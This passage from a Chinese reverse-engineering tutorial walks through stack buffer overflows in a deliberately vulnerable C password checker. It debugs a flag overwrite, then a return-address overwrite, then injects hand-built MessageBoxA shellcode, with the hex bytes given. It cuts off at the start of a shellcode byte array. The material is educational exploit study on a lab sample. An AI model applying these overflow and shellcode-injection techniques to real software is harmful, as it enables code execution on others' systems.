<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408171322671.png" alt="image-20220408171322671" /></p>
<p>此时可以看到 <code>ebp - 4</code>  的位置的值为 <code>ffffffff</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408171428092.png" alt="image-20220408171428092" /></p>
<p>如此继续往下程序即可正常执行完。</p>
<p>接下来重新进行调试，来解析如何触发栈溢出</p>
<p>进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408171748051.png" alt="image-20220408171748051" /></p>
<p>f8 进行调试，然后输入一个 8 位的密码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408171920652.png" alt="image-20220408171920652" /></p>
<p>进入关键 call 进行分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408172002556.png" alt="image-20220408172002556" /></p>
<p>此时可以看到 <code>ebp - 4</code>  的位置值为 <code>00000001</code> ，也就是说比对的值不相等</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408172104738.png" alt="image-20220408172104738" /></p>
<p>往下继续进行调试，可以发现 <code>ebp - 4</code>  的位置值变为 <code>0000000</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408172537320.png" alt="image-20220408172537320" /></p>
<p>上两个单元的值为 <code>34 33 32 31</code>  和 <code>38 37 36 35</code> ，而在 C 语言中的 <code>12345678</code>  在内存中的显示是 <code>31 32 33 34 35 36 37 38 00</code> ，此时在堆栈中的显示则为：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">31</span> <span class="token number">32</span> <span class="token number">33</span> <span class="token number">34</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">35</span> <span class="token number">36</span> <span class="token number">37</span> <span class="token number">38</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00</span></pre></td></tr></table></figure><p>也就是说 <code>00</code>  将 <code>ebp - 4</code>  处的 <code>1</code>  给溢出，导致结果为 <code>true</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408173250865.png" alt="image-20220408173250865" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408173305477.png" alt="image-20220408173305477" /></p>
<p>此时 <code>eax</code>  的返回值为 <code>0</code> ，使得结果输出正确</p>
<p>也就是说 <code>8</code>  位的密码在 <code>strcpy</code>  时， <code>8</code>  位的密码会溢出一个 <code>00</code>  将 flag 覆盖为 <code>0</code> ，导致返回值被覆盖为 <code>0</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408173623866.png" alt="image-20220408173623866" /></p>
<p>使得输出正确</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408173707989.png" alt="image-20220408173707989" /></p>
<h2 id="返回地址覆盖"><a class="anchor" href="#返回地址覆盖">#</a> 返回地址覆盖</h2>
<p>将源码放入生成样例</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408191738992.png" alt="image-20220408191738992" /></p>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PASSWORD</span> <span class="token string">"1234567"</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">int</span> <span class="token function">verify_password</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>password<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> authenticated<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	authenticated<span class="token operator">=</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span>PASSWORD<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//over flowed here!	</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">return</span> authenticated<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token keyword">int</span> valid_flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	FILE <span class="token operator">*</span> fp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"password.txt"</span><span class="token punctuation">,</span><span class="token string">"rw+"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	valid_flag <span class="token operator">=</span> <span class="token function">verify_password</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span>valid_flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"incorrect password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token keyword">else</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratulation! You have passed the verification!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>与上文不同的是，这里将 <code>scanf</code>  读入字符串改为通过 <code>fopen函数</code> 和 <code>fscanf函数</code> 从文件中读取字符串</p>
<p>样例测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408192148562.png" alt="image-20220408192148562" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408192209996.png" alt="image-20220408192209996" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408192230783.png" alt="image-20220408192230783" /></p>
<p>而当密码足够长时，程序则破溃</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408192321374.png" alt="image-20220408192321374" /></p>
<p>查看错误报告</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408192356915.png" alt="image-20220408192356915" /></p>
<p>可以看到在访问 <code>Offset:38323736</code>  偏移时出现错误</p>
<p><strong>报错分析</strong></p>
<p>OD 中打开，找到关键入口点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408192617560.png" alt="image-20220408192617560" /></p>
<p>进入函数，看到俩个跳转表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408192642730.png" alt="image-20220408192642730" /></p>
<p>判断 <code>fopen</code>  是否顺利执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193022476.png" alt="image-20220408193022476" /></p>
<p>f8 调试到关键函数，然后进入其中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193117048.png" alt="image-20220408193117048" /></p>
<p>可以看到与上文的样例并没有什么区别</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193147835.png" alt="image-20220408193147835" /></p>
<p>此时 esp 的值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193257387.png" alt="image-20220408193257387" /></p>
<p>继续调试可以看到 esp 的位置变为 <code>0012FF80</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193405240.png" alt="image-20220408193405240" /></p>
<p>继续往下进行调试，测试是否会被淹没</p>
<p>调试到 <code>strcpy函数</code> ，观察 ebp 的位置</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193527385.png" alt="image-20220408193527385" /></p>
<p>f8 继续进行调试，可以发现 ebp 的值被淹没</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193656056.png" alt="image-20220408193656056" /></p>
<p>此时对 ebp 的位置进行修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193818874.png" alt="image-20220408193818874" /></p>
<p>修改为 <code>12345678</code>  进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193855582.png" alt="image-20220408193855582" /></p>
<p>f8 调试到 ret 会发现程序已经退出，而 eip 的值变为 <code>38323736</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408193941852.png" alt="image-20220408193941852" /></p>
<p><strong>测试淹没地址</strong></p>
<p>修改 <code>password</code>  中的值，重新进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408194143600.png" alt="image-20220408194143600" /></p>
<p>f8 进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408194425389.png" alt="image-20220408194425389" /></p>
<p>用 <code>010</code>  打开 <code>password</code>  文件后，修改文件格式</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408194537679.png" alt="image-20220408194537679" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408194558152.png" alt="image-20220408194558152" /></p>
<p>对比返回值 <code>6A696867</code> ，也就是 password 文件中的 <code>ghij</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408194713343.png" alt="image-20220408194713343" /></p>
<p>f8 调试到 ret，可以看到返回值 eip 为 <code>6A696867</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408194829811.png" alt="image-20220408194829811" /></p>
<p>修改改地址的值，重新进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408194948524.png" alt="image-20220408194948524" /></p>
<p>可以发现 ebp 的值发生变化</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408195049855.png" alt="image-20220408195049855" /></p>
<p>返回值 eip 也随即发生变化</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408195151138.png" alt="image-20220408195151138" /></p>
<p><strong>修改返回值</strong></p>
<p>重新调试进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408195313338.png" alt="image-20220408195313338" /></p>
<p>可以看到当 je 跳转到 <code>0040111F</code>  位置时成功，将 password 的值修改为 <code>1F 11 40 00</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408195509232.png" alt="image-20220408195509232" /></p>
<p>运行测试，可以发现输出成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408195649496.png" alt="image-20220408195649496" /></p>
<p><strong>查看产生原因</strong></p>
<p>重新调试进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408195939711.png" alt="image-20220408195939711" /></p>
<p>查看 strcpy 之前的返回值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408200018106.png" alt="image-20220408200018106" /></p>
<p>strcpy 之后的返回值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408200043807.png" alt="image-20220408200043807" /></p>
<h2 id="手工代码植入"><a class="anchor" href="#手工代码植入">#</a> 手工代码植入</h2>
<p>将源码放入生成样例</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408200712959.png" alt="image-20220408200712959" /></p>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;WINDOWS.h></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PASSWORD</span> <span class="token string">"1234567"</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">int</span> <span class="token function">verify_password</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>password<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">int</span> authenticated<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	authenticated<span class="token operator">=</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span>PASSWORD<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//over flowed here!	</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">return</span> authenticated<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token keyword">int</span> valid_flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	FILE <span class="token operator">*</span> fp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"password.txt"</span><span class="token punctuation">,</span><span class="token string">"rw+"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	valid_flag <span class="token operator">=</span> <span class="token function">verify_password</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span>valid_flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"incorrect password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token keyword">else</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratulation! You have passed the verification!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>运行样例，弹出 MessageBox</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408201458620.png" alt="image-20220408201458620" /></p>
<p>然而在源代码中并没有 MessageBox 指令</p>
<p>这里我们通过修改 password 中的值为如下结果，对其进行处理来实现以上效果</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>悙悙<span class="token number">3</span>跾SSS戈誻袗悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙悙瘊</pre></td></tr></table></figure><p>在 010 中查看可以发现多为 <code>滑板指令90</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408201235359.png" alt="image-20220408201235359" /></p>
<p>弹出 MessageBox</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408201348560.png" alt="image-20220408201348560" /></p>
<p>淹没返回值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408201420422.png" alt="image-20220408201420422" /></p>
<p>MessageBox 分为：</p>
<ul>
<li>MessageBoxA</li>
<li>MessageBoxW</li>
</ul>
<p>这里我们使用 MessageBoxA 来实现，而 MessageBoxA 又有两种情况</p>
<ul>
<li>一种是当前操作系统上存在一个地址，而这个地址只有你的操作系统可以调用</li>
<li>另一种是动态寻找它的地址，在任何机器上都能使用</li>
</ul>
<p>MessageBox 组成</p>
<ul>
<li>user32.dll base</li>
<li>offset</li>
<li>address：base + offset</li>
</ul>
<p>打开 VS 安装自带的一个工具</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408205854723.png" alt="image-20220408205854723" /></p>
<p>打开后将任意文件拖入即可查看 base</p>
<p>得到 base：0x77D1000</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408210018270.png" alt="image-20220408210018270" /></p>
<p>查看 MessageBoxA 可以得到 offset：0x000407EA</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408210157709.png" alt="image-20220408210157709" /></p>
<p>计算可得 address 为 <code>77D507EA</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408210521497.png" alt="image-20220408210521497" /></p>
<p>将 010 在 OD 中打开，拉至底部空白处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408210731451.png" alt="image-20220408210731451" /></p>
<p><strong>直接传参</strong></p>
<p>传入四个参数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408210832737.png" alt="image-20220408210832737" /></p>
<p>然后 <code>call 0x77D507EA</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408210937175.png" alt="image-20220408210937175" /></p>
<p>而这种情况下会被 <code>00</code>  截断</p>
<p><strong>使用寄存器传参</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408211205840.png" alt="image-20220408211205840" /></p>
<p>然后通过 mov 指令将地址放入 eax</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408211330608.png" alt="image-20220408211330608" /></p>
<p>如此即可成功</p>
<p>全选，然后二进制复制，即可得到</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">33</span> DB <span class="token number">53</span> <span class="token number">53</span> <span class="token number">53</span> <span class="token number">53</span> B8 EA <span class="token number">07</span> D5 <span class="token number">77</span> FF D0</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408211421872.png" alt="image-20220408211421872" /></p>
<p>在 C 语言中显示为</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>即会出现弹窗错误。</p>
<p><strong>验证原理</strong></p>
<p>将 password 中的值进行如下修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408211930562.png" alt="image-20220408211930562" /></p>
<p>在 OD 中进行测试</p>
<p>调试到运行 strcpy 之前</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408212050146.png" alt="image-20220408212050146" /></p>
<p>f8 调试，查看 ebp 的位置</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408212159904.png" alt="image-20220408212159904" /></p>
<p>将内容粘贴，当运行到这个位置是即会弹窗</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408212423456.png" alt="image-20220408212423456" /></p>
<p>通过控制返回值来使它得以运行到这个位置</p>
<p>查看返回值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408212606253.png" alt="image-20220408212606253" /></p>
<p>修改返回值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408212744000.png" alt="image-20220408212744000" /></p>
<p>OD 重新进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408212911088.png" alt="image-20220408212911088" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408212943784.png" alt="image-20220408212943784" /></p>
<p>f8 运行至 ret 时，跳转到 buffer 头部位置</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408213025194.png" alt="image-20220408213025194" /></p>
<p>清空 ebx</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408213105018.png" alt="image-20220408213105018" /></p>
<p><code>call eax</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408213132827.png" alt="image-20220408213132827" /></p>
<p>f8 运行，弹出消息框</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408213149383.png" alt="image-20220408213149383" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/400F8AAB33697D4CBFBF3AD41ED1F6A5.gif" alt="img-400F8AAB33697D4CBFBF3AD41ED1F6A5" /></p>
]]></content>
      <categories>
        <category>二进制逆向</category>
      </categories>
      <tags>
        <tag>二进制逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制漏洞shellcode编写与变形</title>
    <url>/article/230cca83.html</url>
    <content><![CDATA[<h2 id="加载与调试shellcode"><a class="anchor" href="#加载与调试shellcode">#</a> 加载与调试 shellcode</h2>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">unsigned</span> <span class="token keyword">char</span> eax<span class="token punctuation">,</span>shellcode<span class="token punctuation">[</span><span class="token number">169</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token 